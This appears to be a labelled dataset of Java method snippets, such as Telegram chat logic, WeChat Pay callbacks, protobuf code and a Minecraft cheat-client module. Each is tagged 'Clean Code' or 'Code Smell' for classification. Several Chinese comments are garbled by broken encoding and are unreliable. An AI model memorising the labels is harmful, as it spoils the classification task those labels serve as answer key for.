public static boolean canDeleteMessage(int currentAccount,boolean inScheduleMode,TLRPC.Message message,TLRPC.Chat chat){
  if (message == null) {
    return false;
  }
  if (ChatObject.isChannelAndNotMegaGroup(chat) && message.action instanceof TLRPC.TL_messageActionChatJoinedByRequest) {
    return false;
  }
  if (message.id < 0) {
    return true;
  }
  if (chat == null && message.peer_id.channel_id != 0) {
    chat=MessagesController.getInstance(currentAccount).getChat(message.peer_id.channel_id);
  }
  if (ChatObject.isChannel(chat)) {
    if (inScheduleMode && !chat.megagroup) {
      return chat.creator || chat.admin_rights != null && (chat.admin_rights.delete_messages || message.out);
    }
    if (message.out && message instanceof TLRPC.TL_messageService) {
      return message.id != 1 && ChatObject.canUserDoAdminAction(chat,ChatObject.ACTION_DELETE_MESSAGES);
    }
    return inScheduleMode || message.id != 1 && (chat.creator || chat.admin_rights != null && (chat.admin_rights.delete_messages || message.out && (chat.megagroup || chat.admin_rights.post_messages)) || chat.megagroup && message.out);
  }
  return inScheduleMode || isOut(message) || !ChatObject.isChannel(chat);
}",0,Clean Code
"protected void onGuildUserAvatarPendantUpdate(String str,String str2){
}",0,Clean Code
"@Specialization(guards={""parent == getMappingClass()"",""checkIsValidMappingAmendment()""}) protected VmMapping evalMappingClass(VirtualFrame frame,@SuppressWarnings(""unused"") VmClass parent){
  return new VmMapping(frame.materialize(),BaseModule.getMappingClass().getPrototype(),members);
}
",0,Clean Code
"private void getSecondaryFunctionCallChanges(final IAddress primaryAddr,final IAddress secondaryAddr,final ECallDirection callDirection,final List<Triple<RawFunction,RawFunction,EExistence>> returnValue){
  final RawFunction priStartFunction=diff.getCallGraph(ESide.PRIMARY).getFunction(primaryAddr);
  final RawFunction secStartFunction=diff.getCallGraph(ESide.SECONDARY).getFunction(secondaryAddr);
  final Multiset<RawFunction> priCalledFunctions=getFunctions(priStartFunction,callDirection);
  final Multiset<RawFunction> secCalledFunctions=getFunctions(secStartFunction,callDirection);
  final Collection<RawFunction> priRemoved=new ArrayList<>();
  final Collection<RawFunction> secToRemove=new ArrayList<>();
  for (  final RawFunction secFunction : secCalledFunctions) {
    final RawFunction priFunction=secFunction.getMatchedFunction();
    if (priFunction != null && priCalledFunctions.remove(priFunction)) {
      priRemoved.add(priFunction);
      secToRemove.add(secFunction);
    }
  }
  secCalledFunctions.removeAll(secToRemove);
  for (  final RawFunction secFunction : secCalledFunctions) {
    returnValue.add(Triple.make(secFunction.getMatchedFunction(),secFunction,EExistence.ADDED));
  }
  priCalledFunctions.addAll(priRemoved);
  secCalledFunctions.addAll(secToRemove);
  final Collection<RawFunction> priToRemove=new ArrayList<>();
  for (  final RawFunction priFunction : priCalledFunctions) {
    final RawFunction secFunction=priFunction.getMatchedFunction();
    if (secFunction != null && secCalledFunctions.remove(secFunction)) {
      priToRemove.add(priFunction);
    }
  }
  priCalledFunctions.removeAll(priToRemove);
  for (  final RawFunction priFunction : priCalledFunctions) {
    returnValue.add(Triple.make(priFunction,priFunction.getMatchedFunction(),EExistence.REMOVED));
  }
}
",0,Clean Code
"/** 
 * Get the external storage location where the workflow input payload is stored/to be stored
 * @param path the path for which the external storage location is to be populated
 * @param operation the operation to be performed (read or write)
 * @param payloadType the type of payload (input or output)
 * @return {@link ExternalStorageLocation} containing the uri and the path to the payload isstored in external storage
 */
ExternalStorageLocation getExternalStorageLocation(String path,String operation,String payloadType);
",0,Clean Code
"@Override public int getContentResId(){
  return R.xml.getapps;
}
",0,Clean Code
"/** 
 * {@inheritDoc}
 */
@SneakyThrows @Override public void onEvent(EventSource eventSource,String id,String type,String data){
  log.info(""OpenAI returns data: {}"",data);
  if (data.equals(""[DONE]"")) {
    log.info(""OpenAI returns data ended"");
    sseEmitter.send(SseEmitter.event().id(""[DONE]"").data(""[DONE]"").reconnectTime(3000));
    sseEmitter.complete();
    return;
  }
  ObjectMapper mapper=new ObjectMapper();
  mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,false);
  ChatCompletionResponse completionResponse=mapper.readValue(data,ChatCompletionResponse.class);
  String text=completionResponse.getChoices().get(0).getDelta() == null ? completionResponse.getChoices().get(0).getText() : completionResponse.getChoices().get(0).getDelta().getContent();
  Message message=new Message();
  if (text != null) {
    message.setContent(text);
    sseEmitter.send(SseEmitter.event().id(completionResponse.getId()).data(message).reconnectTime(3000));
  }
}",0,Clean Code
"@Override public Integer getN(){
  return n;
}
",0,Clean Code
"public void setGuildPsvboxUnreadCnt(int i2){
  this.guildPsvboxUnreadCnt=i2;
}",0,Clean Code
"@Override protected void finish(){
  if (finished.get()) {
    return;
  }
  if (store.getValue() == null) {
    return;
  }
  if (existingEntry != null && existingEntry.getStore().equals(store.getValue())) {
    commit(false);
    return;
  }
  if (!validator.getValue().validate()) {
    var msg=validator.getValue().getValidationResult().getMessages().getFirst().getText();
    TrackEvent.info(msg);
    var newMessage=msg;
    if (Objects.equals(newMessage,messageProp.getValue())) {
      newMessage=newMessage + "" "";
    }
    messageProp.setValue(newMessage);
    changedSinceError.setValue(false);
    return;
  }
  ThreadHelper.runAsync(() -> {
    if (entry.getValue() == null) {
      return;
    }
    try (var b=new BooleanScope(busy).start()){
      DataStorage.get().addStoreEntryInProgress(entry.getValue());
      entry.getValue().validateOrThrow();
      commit(true);
    }
 catch (    Throwable ex) {
      if (ex instanceof ValidationException) {
        ErrorEvent.expected(ex);
        skippable.set(false);
      }
 else {
        skippable.set(true);
      }
      var newMessage=ExceptionConverter.convertMessage(ex);
      if (Objects.equals(newMessage,messageProp.getValue())) {
        newMessage=newMessage + "" "";
      }
      messageProp.setValue(newMessage);
      changedSinceError.setValue(false);
      ErrorEvent.fromThrowable(ex).omit().handle();
    }
 finally {
      DataStorage.get().removeStoreEntryInProgress(entry.getValue());
    }
  }
);
}
",0,Clean Code
"private Builder(){
  maybeForceBuilderInitialization();
}
private Builder(BuilderParent parent){
  super(parent);
  maybeForceBuilderInitialization();
}
",0,Clean Code
"private WorkflowTask createWorkflowTask(String name){
  WorkflowTask task=new WorkflowTask();
  task.setName(name);
  task.setTaskReferenceName(name);
  return task;
}
",0,Clean Code
"public int getFeedsType(){
  return this.feedsType;
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.ModelDataProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.ModelDataProto other=(org.tribuo.protos.core.ModelDataProto)obj;
  if (!getName().equals(other.getName()))   return false;
  if (hasProvenance() != other.hasProvenance())   return false;
  if (hasProvenance()) {
    if (!getProvenance().equals(other.getProvenance()))     return false;
  }
  if (getGenerateProbabilities() != other.getGenerateProbabilities())   return false;
  if (hasFeatureDomain() != other.hasFeatureDomain())   return false;
  if (hasFeatureDomain()) {
    if (!getFeatureDomain().equals(other.getFeatureDomain()))     return false;
  }
  if (hasOutputDomain() != other.hasOutputDomain())   return false;
  if (hasOutputDomain()) {
    if (!getOutputDomain().equals(other.getOutputDomain()))     return false;
  }
  if (!getTribuoVersion().equals(other.getTribuoVersion()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public String getAreaId(){
  return this.areaId;
}
",0,Clean Code
"@Override public SetSignatureScRsp create(){
  return SetSignatureScRsp.newInstance();
}
",0,Clean Code
"public static void putChar(Object obj,long offset,char value){
  Platform.UNSAFE.putChar(obj,offset,value);
}
",0,Clean Code
"public String getOrgID(){
  return this.orgID;
}
",0,Clean Code
"@Override public String notify(String notifyStr) throws Exception {
  String xmlBack=""<xml><return_code><![CDATA[FAIL]]></return_code><return_msg><![CDATA[鎶ユ枃涓虹┖]]></return_msg></xml> "";
  Map<String,String> resultMap=WXPayUtil.xmlToMap(notifyStr);
  if (StringUtils.isEmpty(resultMap.get(""out_trade_no""))) {
    ExceptionCast.cast(PayCode.WECHAT_PAY_NOTIFY_FAIL,""weixin_XML missing out_trade_no"");
  }
  if (!resultMap.get(""result_code"").equals(""SUCCESS"")) {
    ExceptionCast.cast(PayCode.WECHAT_PAY_NOTIFY_FAIL,""pay fail"");
  }
  CfOrder cfOrder=cfOrderService.findById(resultMap.get(""out_trade_no""),false);
  if (cfOrder == null) {
    ExceptionCast.cast(PayCode.ORDER_DOES_NOT_EXIST,notifyStr);
  }
  if (cfOrder.getStatus() == PayStatus.PAID) {
    return null;
  }
  if (cfOrder.getPaymentAgencyShortName().equals(""package"")) {
    CfUserPaymentAgency cfUserPaymentAgency=cfUserPaymentAgencyService.findById(cfOrder.getId());
    if (cfUserPaymentAgency != null) {
      cfOrder.setPaymentAgencyShortName(cfUserPaymentAgency.getPaymentAgencyShortName());
    }
 else {
      cfOrder.setPaymentAgencyShortName(""wei_xin_pay_cny"");
    }
  }
  CfUserPaymentAgency cfUserPaymentAgency=cfUserPaymentAgencyService.findById(cfOrder.getUserPaymentAgencyId());
  if (cfUserPaymentAgency == null) {
    ExceptionCast.cast(PayCode.MERCHANT_PAYMENT_ACCOUNT_DOES_NOT_EXIST,notifyStr);
  }
  WxPayAppConfig _wxPayAppConfig=this._initWxPayAppConfig(cfUserPaymentAgency);
  WXPay wxpayApp=new WXPay(_wxPayAppConfig);
  if (wxpayApp.isPayResultNotifySignatureValid(resultMap)) {
    if (resultMap.get(""return_code"").equals(""SUCCESS"")) {
      if (StringUtils.isNotEmpty(resultMap.get(""out_trade_no""))) {
        cfOrder.setThirdPartyOrderId(resultMap.get(""transaction_id""));
        cfOrder.setPayTime(DateUtil.dateToStamp(resultMap.get(""time_end""),""yyyyMMddHHmmss""));
        cfOrderService.paySuccessAndupdateOrder(cfOrder,(new BigDecimal(resultMap.get(""total_fee""))).divide(new BigDecimal(100)));
        xmlBack=""<xml><return_code><![CDATA[SUCCESS]]></return_code><return_msg><![CDATA[OK]]></return_msg></xml>"";
      }
    }
  }
  return xmlBack;
}",0,Clean Code
"@Override public IGProStickyTextChannel getActiveTextChannel(){
  return new GGProStickyTextChannel(this.mInfo.getActiveTextChannel());
}
",0,Clean Code
"/** 
 * Generates an array of the indices that are active in both this vector and  {@code other}
 * @param other The vector to intersect.
 * @return An array of indices that are active in both vectors.
 */
public int[] intersection(SparseVector other){
  List<Integer> diffIndicesList=new ArrayList<>();
  Iterator<VectorTuple> itr=iterator();
  Iterator<VectorTuple> otherItr=other.iterator();
  if (itr.hasNext() && otherItr.hasNext()) {
    VectorTuple tuple=itr.next();
    VectorTuple otherTuple=otherItr.next();
    while (itr.hasNext() && otherItr.hasNext()) {
      if (tuple.index == otherTuple.index) {
        diffIndicesList.add(tuple.index);
        tuple=itr.next();
        otherTuple=otherItr.next();
      }
 else       if (tuple.index < otherTuple.index) {
        tuple=itr.next();
      }
 else {
        otherTuple=otherItr.next();
      }
    }
    while (itr.hasNext()) {
      if (tuple.index == otherTuple.index) {
        diffIndicesList.add(tuple.index);
      }
      tuple=itr.next();
    }
    while (otherItr.hasNext()) {
      if (tuple.index == otherTuple.index) {
        diffIndicesList.add(tuple.index);
      }
      otherTuple=otherItr.next();
    }
    if (tuple.index == otherTuple.index) {
      diffIndicesList.add(tuple.index);
    }
  }
  return Util.toPrimitiveInt(diffIndicesList);
}
",0,Clean Code
"@Override public RegionEntry create(){
  return RegionEntry.newInstance();
}
",0,Clean Code
"@Test void should_fail_when_adding_null_value(){
  Metadata metadata=new Metadata();
  assertThatThrownBy(() -> metadata.put(""key"",null)).isExactlyInstanceOf(IllegalArgumentException.class).hasMessage(""The metadata value for the key 'key' cannot be null"");
}
",0,Clean Code
String chat11(String userMessage);,0,Clean Code
"public String getKeySerializer(){
  return keySerializer;
}
",0,Clean Code
"@CallSuper @Override public void onOrientationChanged(int orientation){
  if (mActivity == null || mActivity.isFinishing())   return;
  int lastOrientation=mOrientation;
  if (orientation == OrientationEventListener.ORIENTATION_UNKNOWN) {
    mOrientation=-1;
    return;
  }
  if (orientation > 350 || orientation < 10) {
    int o=mActivity.getRequestedOrientation();
    if (o == ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE && lastOrientation == 0)     return;
    if (mOrientation == 0)     return;
    mOrientation=0;
    onOrientationPortrait(mActivity);
  }
 else   if (orientation > 80 && orientation < 100) {
    int o=mActivity.getRequestedOrientation();
    if (o == ActivityInfo.SCREEN_ORIENTATION_PORTRAIT && lastOrientation == 90)     return;
    if (mOrientation == 90)     return;
    mOrientation=90;
    onOrientationReverseLandscape(mActivity);
  }
 else   if (orientation > 260 && orientation < 280) {
    int o=mActivity.getRequestedOrientation();
    if (o == ActivityInfo.SCREEN_ORIENTATION_PORTRAIT && lastOrientation == 270)     return;
    if (mOrientation == 270)     return;
    mOrientation=270;
    onOrientationLandscape(mActivity);
  }
}",0,Clean Code
"@Override public GachaItem clone(){
  return new GachaItem().copyFrom(this);
}
",0,Clean Code
"public static DuckDBSelect generateSelect(DuckDBGlobalState globalState,int nrColumns){
  DuckDBTables targetTables=globalState.getSchema().getRandomTableNonEmptyTables();
  DuckDBExpressionGenerator gen=new DuckDBExpressionGenerator(globalState).setColumns(targetTables.getColumns());
  DuckDBSelect select=new DuckDBSelect();
  List<Node<DuckDBExpression>> columns=new ArrayList<>();
  for (int i=0; i < nrColumns; i++) {
    Node<DuckDBExpression> expression=gen.generateExpression();
    columns.add(expression);
  }
  select.setFetchColumns(columns);
  List<DuckDBTable> tables=targetTables.getTables();
  List<TableReferenceNode<DuckDBExpression,DuckDBTable>> tableList=tables.stream().map(t -> new TableReferenceNode<DuckDBExpression,DuckDBTable>(t)).collect(Collectors.toList());
  List<Node<DuckDBExpression>> joins=DuckDBJoin.getJoins(tableList,globalState);
  select.setJoinList(joins.stream().collect(Collectors.toList()));
  select.setFromList(tableList.stream().collect(Collectors.toList()));
  if (Randomly.getBoolean()) {
    select.setWhereClause(gen.generateExpression());
  }
  if (Randomly.getBoolean()) {
    select.setOrderByClauses(gen.generateOrderBys());
  }
  if (Randomly.getBoolean()) {
    select.setGroupByExpressions(gen.generateExpressions(Randomly.smallNumber() + 1));
  }
  if (Randomly.getBoolean()) {
    select.setLimitClause(DuckDBConstant.createIntConstant(Randomly.getNotCachedInteger(0,Integer.MAX_VALUE)));
  }
  if (Randomly.getBoolean()) {
    select.setOffsetClause(DuckDBConstant.createIntConstant(Randomly.getNotCachedInteger(0,Integer.MAX_VALUE)));
  }
  if (Randomly.getBoolean()) {
    select.setHavingClause(gen.generateHavingClause());
  }
  return select;
}",0,Clean Code
"/** 
 * Get settings key value from  {@link SettingNamespace} namespace and of {@link SettingType} type.
 * @param context The {@link Context} for operations.
 * @param namespace The {@link SettingNamespace} in which to get key value from.
 * @param type The {@link SettingType} for the key.
 * @param key The {@link String} name for key.
 * @param def The {@link Object} default value for key.
 * @return Returns the key value. This will be {@code null} if an exception is raised.
 */
@Nullable public static Object getSettingsValue(@NonNull Context context,@NonNull SettingNamespace namespace,@NonNull SettingType type,@NonNull String key,@Nullable Object def){
  try {
switch (namespace) {
case GLOBAL:
switch (type) {
case FLOAT:
        return Settings.Global.getFloat(context.getContentResolver(),key);
case INT:
      return Settings.Global.getInt(context.getContentResolver(),key);
case LONG:
    return Settings.Global.getLong(context.getContentResolver(),key);
case STRING:
  return Settings.Global.getString(context.getContentResolver(),key);
case URI:
return Settings.Global.getUriFor(key);
}
case SECURE:
switch (type) {
case FLOAT:
return Settings.Secure.getFloat(context.getContentResolver(),key);
case INT:
return Settings.Secure.getInt(context.getContentResolver(),key);
case LONG:
return Settings.Secure.getLong(context.getContentResolver(),key);
case STRING:
return Settings.Secure.getString(context.getContentResolver(),key);
case URI:
return Settings.Secure.getUriFor(key);
}
case SYSTEM:
switch (type) {
case FLOAT:
return Settings.System.getFloat(context.getContentResolver(),key);
case INT:
return Settings.System.getInt(context.getContentResolver(),key);
case LONG:
return Settings.System.getLong(context.getContentResolver(),key);
case STRING:
return Settings.System.getString(context.getContentResolver(),key);
case URI:
return Settings.System.getUriFor(key);
}
}
}
 catch (Settings.SettingNotFoundException e) {
}
catch (Exception e) {
Logger.logError(LOG_TAG,""Failed to get \"""" + key + ""\"" key value from settings \""""+ namespace.name()+ ""\"" namespace of type \""""+ type.name()+ ""\"""");
}
return def;
}
",0,Clean Code
"/** 
 * <code>repeated .RogueUnlockProgress unlock_progress_list = 13;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableUnlockProgressList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RogueUnlockProgressOuterClass.RogueUnlockProgress> getUnlockProgressList(){
  return unlockProgressList;
}",0,Clean Code
"public synchronized RogueBonusSelectMenu updateBonusSelect(){
  if (this.pendingBonusSelects > 0 && this.getBonusSelect() == null) {
    this.bonusSelect=new RogueBonusSelectMenu(this);
    this.pendingBonusSelects--;
    var proto=new PacketSyncRogueCommonPendingActionScNotify(this.bonusSelect.toProto(),this.actionUniqueId);
    this.actionUniqueId+=2;
    this.pendingAction=proto.toProto();
    this.getPlayer().sendPacket(proto);
    return this.bonusSelect;
  }
  return null;
}",0,Clean Code
"/** 
 * This code is copied from SlotCrafting.onCrafting TODO - convert this into a mixin to avoid duplicating code
 * @param player - player crafting the items
 * @param stack - item and quantity that was crafted
 * @param craftMatrix - the InventoryCrafting representing the item recipe
 */
protected static void onCrafting(EntityPlayer player,ItemStack stack,InventoryCrafting craftMatrix){
  if (stack.getCount() > 0) {
    stack.onCrafting(player.world,player,stack.getCount());
    net.minecraftforge.fml.common.FMLCommonHandler.instance().firePlayerCraftingEvent(player,stack,craftMatrix);
  }
  if (stack.getItem() == Item.getItemFromBlock(Blocks.CRAFTING_TABLE)) {
    player.addStat(AchievementList.BUILD_WORK_BENCH);
  }
  if (stack.getItem() instanceof ItemPickaxe) {
    player.addStat(AchievementList.BUILD_PICKAXE);
  }
  if (stack.getItem() == Item.getItemFromBlock(Blocks.FURNACE)) {
    player.addStat(AchievementList.BUILD_FURNACE);
  }
  if (stack.getItem() instanceof ItemHoe) {
    player.addStat(AchievementList.BUILD_HOE);
  }
  if (stack.getItem() == Items.BREAD) {
    player.addStat(AchievementList.MAKE_BREAD);
  }
  if (stack.getItem() == Items.CAKE) {
    player.addStat(AchievementList.BAKE_CAKE);
  }
  if (stack.getItem() instanceof ItemPickaxe && ((ItemPickaxe)stack.getItem()).getToolMaterial() != Item.ToolMaterial.WOOD) {
    player.addStat(AchievementList.BUILD_BETTER_PICKAXE);
  }
  if (stack.getItem() instanceof ItemSword) {
    player.addStat(AchievementList.BUILD_SWORD);
  }
  if (stack.getItem() == Item.getItemFromBlock(Blocks.ENCHANTING_TABLE)) {
    player.addStat(AchievementList.ENCHANTMENTS);
  }
  if (stack.getItem() == Item.getItemFromBlock(Blocks.BOOKSHELF)) {
    player.addStat(AchievementList.BOOKCASE);
  }
}",0,Clean Code
"/** 
 * Inverts the selected nodes of a graph.
 * @param < NodeType > The type of the nodes in the graph.
 * @param graph The graph in question.
 */
public static <NodeType extends ZyGraphNode<?>>void invertSelection(final AbstractZyGraph<NodeType,?> graph){
  final ArrayList<NodeType> toSelect=new ArrayList<NodeType>();
  final ArrayList<NodeType> toUnselect=new ArrayList<NodeType>();
  graph.iterate(new INodeCallback<NodeType>(){
    @Override public IterationMode next(    final NodeType node){
      if (node.isSelected()) {
        toUnselect.add(node);
      }
 else {
        toSelect.add(node);
      }
      return IterationMode.CONTINUE;
    }
  }
);
  graph.selectNodes(toSelect,toUnselect);
}
",0,Clean Code
"SchemaColumn getPrimaryKeyColumn(int index){
  return index < this.schema.partitionKeys().size() ? this.schema.partitionKeys().get(index) : this.schema.clusteringKeys().get(index - this.schema.partitionKeys().size());
}
",0,Clean Code
"private ImmutableSequenceDatasetProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ImmutableSequenceDatasetProto(){
  examples_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@239ff76d",0,Clean Code
"private void validateUser(final User user){
  if (Objects.isNull(user)) {
    throw new BusinessException(""oauth.userNameNotExits"");
  }
  if (!ValidStatusEnum.VALID.getCode().equals(user.getStatus())) {
    throw new BusinessException(""oauth.invalidUserName"");
  }
  if (RoleCodeEnum.DESKTOP.getDefaultUserId().equals(user.getId())) {
    throw new BusinessException(""oauth.IllegalUserName"");
  }
}
",0,Clean Code
"public void setChatType(int i2){
  this.chatType=i2;
}",0,Clean Code
"@Override public boolean equalsByType(Object type){
  return equalsByType(type,DEFAULT_FIELD_ENUMS);
}
@Override public boolean equalsByType(Object type,FieldEnum... fieldEnums){
  if (type instanceof String) {
    for (    FieldEnum anEnum : fieldEnums) {
      if (anEnum.getFormType().equals(type)) {
        return true;
      }
    }
  }
 else {
    for (    FieldEnum anEnum : fieldEnums) {
      if (Objects.equals(anEnum.getType(),type)) {
        return true;
      }
    }
  }
  return false;
}
",1,Code Smell
"@EventHandler private void onTick(TickEvent.Post event){
  if (mc.world.getDimension().respawnAnchorWorks()) {
    error(""You are in the Nether... disabling."");
    toggle();
    return;
  }
  if (PlayerUtils.shouldPause(pauseOnMine.get(),pauseOnEat.get(),pauseOnDrink.get()))   return;
  if (EntityUtils.getTotalHealth(mc.player) <= minHealth.get())   return;
  if (TargetUtils.isBadTarget(target,targetRange.get())) {
    target=TargetUtils.getPlayerTarget(targetRange.get(),targetPriority.get());
    if (TargetUtils.isBadTarget(target,targetRange.get()))     return;
  }
  FindItemResult anchor=InvUtils.findInHotbar(Items.RESPAWN_ANCHOR);
  FindItemResult glowStone=InvUtils.findInHotbar(Items.GLOWSTONE);
  if (!anchor.found() || !glowStone.found())   return;
  if (breakDelayLeft >= breakDelay.get()) {
    BlockPos breakPos=findBreakPos(target.getBlockPos());
    if (breakPos != null) {
      breakDelayLeft=0;
      if (rotationMode.get() == RotationMode.Both || rotationMode.get() == RotationMode.Break) {
        BlockPos immutableBreakPos=breakPos.toImmutable();
        Rotations.rotate(Rotations.getYaw(breakPos),Rotations.getPitch(breakPos),50,() -> breakAnchor(immutableBreakPos,anchor,glowStone));
      }
 else       breakAnchor(breakPos,anchor,glowStone);
    }
  }
  if (placeDelayLeft >= placeDelay.get() && place.get()) {
    BlockPos placePos=findPlacePos(target.getBlockPos());
    if (placePos != null) {
      placeDelayLeft=0;
      BlockUtils.place(placePos.toImmutable(),anchor,(rotationMode.get() == RotationMode.Place || rotationMode.get() == RotationMode.Both),50);
    }
  }
  placeDelayLeft++;
  breakDelayLeft++;
}",0,Clean Code
"@Override public int getColor(int key){
  if (key == Theme.key_actionBarDefaultSubmenuBackground) {
    return 0xFF282829;
  }
 else   if (key == Theme.key_actionBarDefaultSubmenuItem) {
    return 0xFFFFFFFF;
  }
 else   if (key == Theme.key_dialogBackground) {
    return 0xFF1F1F1F;
  }
 else   if (key == Theme.key_dialogTextBlack) {
    return -592138;
  }
 else   if (key == Theme.key_dialogTextGray3) {
    return -8553091;
  }
 else   if (key == Theme.key_chat_emojiPanelBackground) {
    return 0xFF000000;
  }
 else   if (key == Theme.key_chat_emojiPanelShadowLine) {
    return -1610612736;
  }
 else   if (key == Theme.key_chat_emojiBottomPanelIcon) {
    return -9539985;
  }
 else   if (key == Theme.key_chat_emojiPanelBackspace) {
    return -9539985;
  }
 else   if (key == Theme.key_chat_emojiPanelIcon) {
    return -9539985;
  }
 else   if (key == Theme.key_windowBackgroundWhiteBlackText) {
    return -1;
  }
 else   if (key == Theme.key_featuredStickers_addedIcon) {
    return -11754001;
  }
 else   if (key == Theme.key_listSelector) {
    return 0x1FFFFFFF;
  }
 else   if (key == Theme.key_profile_tabSelectedText) {
    return 0xFFFFFFFF;
  }
 else   if (key == Theme.key_profile_tabText) {
    return 0xFFFFFFFF;
  }
 else   if (key == Theme.key_profile_tabSelectedLine) {
    return 0xFFFFFFFF;
  }
 else   if (key == Theme.key_profile_tabSelector) {
    return 0x14FFFFFF;
  }
 else   if (key == Theme.key_chat_emojiSearchIcon || key == Theme.key_featuredStickers_addedIcon) {
    return 0xFF878787;
  }
 else   if (key == Theme.key_chat_emojiSearchBackground) {
    return 0x2E878787;
  }
 else   if (key == Theme.key_windowBackgroundGray) {
    return 0xFF0D0D0D;
  }
  if (resourcesProvider != null) {
    return resourcesProvider.getColor(key);
  }
 else {
    return Theme.getColor(key);
  }
}",0,Clean Code
"/** 
 * Estimates the count of tokens in the specified text.
 * @param text the text
 * @return the estimated count of tokens
 */
default int estimateTokenCount(String text){
  return estimateTokenCount(userMessage(text));
}
/** 
 * Estimates the count of tokens in the specified message.
 * @param userMessage the message
 * @return the estimated count of tokens
 */
default int estimateTokenCount(UserMessage userMessage){
  return estimateTokenCount(singletonList(userMessage));
}
/** 
 * Estimates the count of tokens in the specified prompt.
 * @param prompt the prompt
 * @return the estimated count of tokens
 */
default int estimateTokenCount(Prompt prompt){
  return estimateTokenCount(prompt.text());
}
/** 
 * Estimates the count of tokens in the specified text segment.
 * @param textSegment the text segment
 * @return the estimated count of tokens
 */
default int estimateTokenCount(TextSegment textSegment){
  return estimateTokenCount(textSegment.text());
}
/** 
 * Estimates the count of tokens in the specified list of messages.
 * @param messages the list of messages
 * @return the estimated count of tokens
 */
int estimateTokenCount(List<ChatMessage> messages);
",0,Clean Code
"public void testWriteMultiRecordBatch() throws IOException {
  Foo foo=Foo.create();
  RowEncoder<Foo> encoder=Encoders.bean(Foo.class);
  Path schemaFile=Files.createTempFile(""foo"",""schema"");
  Path dataFile=Files.createTempFile(""foo"",""data"");
  ImmutableList<String> command=ImmutableList.of(PYTHON_EXECUTABLE,""-m"",PYTHON_MODULE,""test_write_multi_record_batch"",schemaFile.toAbsolutePath().toString(),dataFile.toAbsolutePath().toString());
{
    MemoryBuffer buffer=MemoryUtils.buffer(128);
    buffer.writerIndex(0);
    DataTypes.serializeSchema(encoder.schema(),buffer);
    Files.write(schemaFile,buffer.getBytes(0,buffer.writerIndex()));
  }
  ArrowWriter arrowWriter=ArrowUtils.createArrowWriter(encoder.schema());
  int numBatches=5;
  for (int i=0; i < numBatches; i++) {
    int numRows=128;
    for (int j=0; j < numRows; j++) {
      BinaryRow row=encoder.toRow(foo);
      arrowWriter.write(row);
    }
    ArrowRecordBatch recordBatch=arrowWriter.finishAsRecordBatch();
    MemoryBuffer buffer=MemoryUtils.buffer(128);
    ArrowUtils.serializeRecordBatch(recordBatch,buffer);
    arrowWriter.reset();
    Files.write(dataFile,buffer.getBytes(0,buffer.writerIndex()),StandardOpenOption.TRUNCATE_EXISTING);
    Assert.assertTrue(executeCommand(command,30));
  }
}",0,Clean Code
"private static void updateVisibility(final BinDiffGraph<? extends ZyGraphNode<? extends IViewNode<?>>,?> graph,final ZyProximityNode<?> proximityNode){
  final Set<ZyGraphNode<? extends IViewNode<?>>> diffNodesToShow=getNodesToShow(graph,proximityNode);
  if (graph.getSettings().isSync()) {
    final Set<CombinedDiffNode> combinedNodesToShow=new HashSet<>();
    final Set<SuperDiffNode> superNodesToShow=new HashSet<>();
    for (    final ZyGraphNode<? extends IViewNode<?>> node : diffNodesToShow) {
      if (node instanceof SingleDiffNode) {
        combinedNodesToShow.add(((SingleDiffNode)node).getCombinedDiffNode());
        superNodesToShow.add(((SingleDiffNode)node).getSuperDiffNode());
      }
 else       if (node instanceof CombinedDiffNode) {
        combinedNodesToShow.add((CombinedDiffNode)node);
        superNodesToShow.add(((CombinedDiffNode)node).getSuperDiffNode());
      }
    }
    graph.getCombinedGraph().showNodes(combinedNodesToShow,false);
    graph.getSuperGraph().showNodes(superNodesToShow,false);
  }
 else {
    for (    final ZyGraphNode<? extends IViewNode<?>> node : diffNodesToShow) {
      if (node instanceof SingleDiffNode || node instanceof CombinedDiffNode) {
        node.getRawNode().setVisible(true);
      }
    }
  }
}
",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (!super.equals(obj))   return false;
  if (getClass() != obj.getClass())   return false;
  VanillaParameters other=(VanillaParameters)obj;
  if (alpha == null) {
    if (other.alpha != null)     return false;
  }
 else   if (!alpha.equals(other.alpha))   return false;
  if (inputs == null) {
    if (other.inputs != null)     return false;
  }
 else   if (!inputs.equals(other.inputs))   return false;
  if (hasChunkOffset != other.hasChunkOffset)   return false;
  return isLines == other.isLines;
}
",0,Clean Code
"/** 
 * 灏嗘寚瀹氬�艰浆鍖栦负鎸囧畾绫诲瀷
 * @param < T > 娉涘瀷
 * @param obj 鍊�
 * @param cs 绫诲瀷
 * @return 杞崲鍚庣殑鍊�
 */
@SuppressWarnings(""unchecked"") public static <T>T getValueByType(Object obj,Class<T> cs){
  if (obj == null || obj.getClass().equals(cs)) {
    return (T)obj;
  }
  String obj2=String.valueOf(obj);
  Object obj3;
  if (cs.equals(String.class)) {
    obj3=obj2;
  }
 else   if (cs.equals(int.class) || cs.equals(Integer.class)) {
    obj3=Integer.valueOf(obj2);
  }
 else   if (cs.equals(long.class) || cs.equals(Long.class)) {
    obj3=Long.valueOf(obj2);
  }
 else   if (cs.equals(short.class) || cs.equals(Short.class)) {
    obj3=Short.valueOf(obj2);
  }
 else   if (cs.equals(byte.class) || cs.equals(Byte.class)) {
    obj3=Byte.valueOf(obj2);
  }
 else   if (cs.equals(float.class) || cs.equals(Float.class)) {
    obj3=Float.valueOf(obj2);
  }
 else   if (cs.equals(double.class) || cs.equals(Double.class)) {
    obj3=Double.valueOf(obj2);
  }
 else   if (cs.equals(boolean.class) || cs.equals(Boolean.class)) {
    obj3=Boolean.valueOf(obj2);
  }
 else   if (cs.equals(char.class) || cs.equals(Character.class)) {
    obj3=obj2.charAt(0);
  }
 else {
    obj3=obj;
  }
  return (T)obj3;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
